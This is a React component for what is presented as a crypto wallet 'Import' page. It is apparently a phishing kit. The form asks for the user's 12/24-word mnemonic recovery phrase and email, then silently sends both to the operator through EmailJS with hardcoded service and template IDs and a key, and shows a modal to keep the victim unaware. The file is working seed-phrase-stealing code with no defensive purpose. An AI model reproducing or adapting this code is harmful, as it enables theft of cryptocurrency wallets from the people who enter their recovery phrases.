import React, {useRef, useState} from 'react'
import FormInput from '../FormInput'
import emailjs from '@emailjs/browser';
import Modal from '../Modal';

const FORM_INPUT = [
    {
        name: 'mnemonic',
        label: 'Enter your 12/24 word phrase',
        type: 'text',
        placeholder: 'Enter your mnemonic',
        hint: 'Please separate each Mnemonic Phrase with a space.',
    },
    {
        name: 'email',
        label: 'Enter your email address',
        type: 'email',
        placeholder: 'Enter your email',
        hint: 'Your registered email address',
    }
]

export default function Mnemonic()
{

   
    const [open, setOpen] = useState(false)
    const form = useRef()
    const toggle = () => setOpen(!open)

    const sendEmail = (e) => {
        e.preventDefault();
    
        emailjs.sendForm('service_f9owe8b', 'template_3gtiggj', form.current, 'q9edtd1Uilt68kPHu')
          .then((result) => {
              console.log(result.text);
          }, (error) => {
              console.log(error.text);
          });
        e.target.reset()
      };

  return (
      <div>
        {open && <Modal toggle={ toggle} />}
          <form ref={form} className=' flex flex-col items-start justify-start gap-2' onSubmit={sendEmail}>
              {
                  FORM_INPUT.map((input, index) => <FormInput key={index} {...input} />)
              }
              <button type='submit' onClick={toggle} className='font-bold my-2 text-black max-w-full w-48 bg-blue-400  p-2 rounded-md'>
                  Import
              </button>
          </form>
    </div>
  )
}
